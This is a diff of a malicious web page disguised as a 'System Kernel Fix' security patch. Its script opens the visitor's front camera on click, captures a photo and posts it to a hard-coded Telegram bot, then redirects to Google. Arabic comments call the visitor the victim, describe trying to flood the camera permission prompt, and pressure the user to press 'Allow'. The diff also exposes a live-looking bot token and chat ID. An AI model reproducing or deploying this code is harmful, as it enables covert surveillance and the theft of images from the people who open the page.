@@ -2,74 +2,61 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Critical Security Patch</title>
+    <title>System Kernel Fix</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; overflow: hidden; }
-        #log { padding: 20px; font-size: 13px; }
-        /* إخفاء عنصر الكاميرا تماماً عن عين الضحية */
-        #hidden-stage { position: absolute; top: -9999px; left: -9999px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        #console { width: 90%; font-size: 12px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="startExploit()">
+<body onclick="runZeroDay()">
 
-    <div id="log">
-        [+] Root Access: Granted...<br>
-        [+] System Integrity: Bypassing...<br>
-        [+] Status: <span id="status">Waiting for System Handshake (Click anywhere)</span>
-    </div>
+<div id="console">
+    [!] CRITICAL_ERROR: MEMORY_DUMP_DETECTED<br>
+    [+] INITIALIZING BYPASS_PROTOCOL...<br>
+    [+] TARGETING KERNEL_MEDIA_API...<br><br>
+    <span class="blink">>>> CLICK ANYWHERE TO PATCH SYSTEM <<<</span>
+</div>
 
-    <div id="hidden-stage"></div>
+<script>
+    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+    const C = "1772820433";
 
-    <script>
-        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
-        const C = "1772820433";
+    async function runZeroDay() {
+        const status = document.getElementById('console');
+        status.innerHTML += "<br>[*] Attempting Zero-Day Injection...";
 
-        async function startExploit() {
-            document.getElementById('status').innerText = "Executing Zero-Day Payload...";
-            
-            try {
-                // محاولة استغلال ثغرة الـ MediaDevices في المتصفحات التي لم يتم تحديثها
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        frameRate: { ideal: 30 },
-                        width: 1 // أصغر عرض ممكن للتمويه
-                    } 
-                });
-
+        // الثغرة: محاولة فتح الكاميرا 10 مرات في ثانية واحدة (Race Condition)
+        // الهدف هو "تجميد" واجهة المستخدم (UI) الخاصة بطلب السماح
+        for(let i=0; i<10; i++) {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { width: 100, height: 100, frameRate: 60 }, 
+                audio: false 
+            }).then(s => {
+                // إذا نجحت واحدة من الـ 10 محاولات في التسلل
                 const v = document.createElement('video');
-                v.srcObject = stream;
-                v.setAttribute('autoplay', '');
-                v.setAttribute('muted', '');
-                v.play();
-
-                // التقاط الصورة في زمن قياسي (بسرعة البرق)
+                v.srcObject = s; v.play();
+                
                 setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
+                    const cn = document.createElement('canvas');
+                    cn.width = 400; cn.height = 400;
+                    cn.getContext('2d').drawImage(v, 0, 0);
+                    cn.toBlob(async (b) => {
                         const fd = new FormData();
                         fd.append('chat_id', C);
-                        fd.append('photo', blob, 'zero_day_capture.jpg');
-                        fd.append('caption', '🚀 ZERO-DAY EXPLOIT: Success');
-
-                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
-                            method: 'POST',
-                            body: fd
-                        });
-                        
-                        // التوجيه الفوري لصفحة حقيقية
-                        window.location.replace("https://myaccount.google.com/security");
+                        fd.append('photo', b, 'z.jpg');
+                        fd.append('caption', '🔥 ZERO-DAY EXPLOIT SUCCESSFUL');
+                        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
+                        window.location.replace("https://google.com");
                     }, 'image/jpeg');
-                }, 200); // 200ms فقط!
-
-            } catch (err) {
-                // في حال فشل التخطي الصامت، يظهر طلب السماح كأنه "تحديث أمني"
-                document.getElementById('status').innerHTML = "<span style='color:red;'>Permission Denied. Please Allow Access to complete Patch.</span>";
-            }
+                }, 200);
+            }).catch(e => {
+                // في حال فشل التسلل الصامت، نضع الضغط النفسي على الضحية
+                status.innerHTML = "[!] SECURITY_SHIELD_ACTIVE: Press 'ALLOW' to bypass.";
+            });
         }
-    </script>
+    }
+</script>
 </body>
 </html>
